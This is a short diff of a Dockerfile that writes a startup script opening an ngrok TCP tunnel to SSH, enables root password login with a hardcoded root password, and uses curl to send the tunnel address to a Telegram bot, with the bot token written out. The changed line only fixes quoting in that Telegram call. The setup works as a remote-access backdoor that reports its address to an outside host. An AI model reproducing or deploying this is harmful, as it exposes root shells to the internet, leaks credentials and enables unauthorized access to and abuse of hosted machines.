@@ -9,7 +9,7 @@ RUN echo "./ngrok tcp --region id 22 &>/dev/null &" >>/1.sh
 RUN echo '/usr/sbin/sshd -D &&' >>/1.sh
 RUN echo 'PermitRootLogin yes' >>  /etc/ssh/sshd_config 
 RUN echo "PasswordAuthentication yes" >> /etc/ssh/sshd_config
-RUN echo "curl "https://api.telegram.org/bot5663284770:AAHls-QSDcYdukTjbq3KrtZMo09ogWlSsxk/sendMessage?chat_id=1320233599&text=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels)"" >>/1.sh
+RUN echo "curl https://api.telegram.org/bot5663284770:AAHls-QSDcYdukTjbq3KrtZMo09ogWlSsxk/sendMessage?chat_id=1320233599&text=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels)" >>/1.sh
 RUN service ssh start
 RUN chmod 755 /1.sh
 RUN echo root:haznre|chpasswd
